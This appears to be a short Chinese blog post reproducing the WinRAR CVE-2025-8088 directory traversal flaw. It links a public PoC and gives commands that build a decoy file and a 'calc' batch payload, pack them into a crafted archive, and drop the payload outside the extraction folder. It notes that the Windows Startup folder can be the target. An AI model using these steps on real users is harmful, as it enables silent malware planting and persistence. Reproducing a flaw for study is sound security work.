---
title: Winrar_cve20258088_复现
date: 2025-12-11 13:05:13
tags:
---

## 个人复现winrar cve 20258088目录遍历 12.9

### 环境
1.版本号7.12即以前的winrar
2.python3.14
3.win11

### 准备
1.test_a.bat恶意文件
2.test_a.txt诱饵
3.poc脚本
<p>获取生成payload的脚本<br>

[poc脚本](https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-)


### 步骤

#### 第一步生成测试文件

1.生成诱饵文件fake.txt
>echo "这是一个没有问题的诱饵" > test_a.txt

2.生成payload文件test_a.bat
>echo "calc" > test_a.bat

#### 第二步利用poc.py脚本生成压缩包

>python poc.py --decoy test_a.txt --payload test_a.bat --drop "D:\puls\1" --rar "C:\ProgramFiles\WinRAR\rar.exe"

其中的参数
- decoy : 指定诱饵文件
- payload : 指定恶意文件
- drop ：解压时恶意文件释放的目录 可替换为 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 这个目录必须确保存在
- rar ： 指定winrar命令行版本路径

#### 第三步使用winrar解压压缩包
<p>此时发现test_a.bat文件已存在于D:\puls\1目录下

